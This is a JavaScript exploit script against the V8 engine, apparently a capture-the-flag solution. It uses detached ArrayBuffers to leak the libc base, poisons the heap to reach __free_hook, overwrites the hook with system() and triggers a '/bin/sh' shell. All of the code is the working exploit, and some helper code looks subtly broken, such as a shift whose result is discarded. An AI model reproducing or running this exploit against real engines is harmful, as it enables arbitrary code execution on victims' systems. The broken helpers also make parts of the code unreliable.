var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function gc() { for (let i = 0; i < 0x1000; i++) new ArrayBuffer(0x10000); }

function ftoi(val) { 
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

function malloc(size){
	    var a = {};
	    a.length = size;
	    var b = new Uint8Array(a);
	    return b;
}

function setValue(target, value, offset){
	var val = value;
	var idx = 0;
	var num = 1;	
	while(val != 0){
		num = Number(val%0xffn);
		target[offset + idx] = num;
		idx ++;
		val >> 8n;
	}
	console.log("DONE");
}
function libcLeak(){
	var arr1 =  new Float64Array(0x82);
	%ArrayBufferDetach(arr1.buffer);
	var arr2 = new Float64Array(0x100);
	arr2[0] = 1.1;
	arr2.set(arr1);
	offset = 4112528n; //libc-2.27.so
	base = ftoi(arr2[1]) - offset;
	return base;
}
var libcBase = libcLeak();
var mallocHook = libcBase + 0x3ebc30n;
var freeHook = libcBase + 0x3ed8e8n;
var fakeChunk = freeHook - 0x13n + 0x10n;
var system = libcBase + 0x4f550n;
console.log('[+] libc base : 0x'+libcBase.toString(16));
console.log('[+] system : 0x'+system.toString(16));
console.log('[+] free hook : 0x'+freeHook.toString(16));
var arr = new Float64Array(0xc);

%ArrayBufferDetach(arr.buffer);

var typedarr = new Float64Array(0x1);
typedarr[0] = itof(fakeChunk);
arr.set(typedarr);

var tmp = malloc(0x60);
var hook = [];
hook.length = 0x60;
var hook_ = new Uint8Array(hook);
var idx = 0;

for(;idx<0x10;idx++){
	hook_[3+idx] = Number((system >> BigInt(8* idx)) % 0x100n);
}
console.log('/bin/sh');
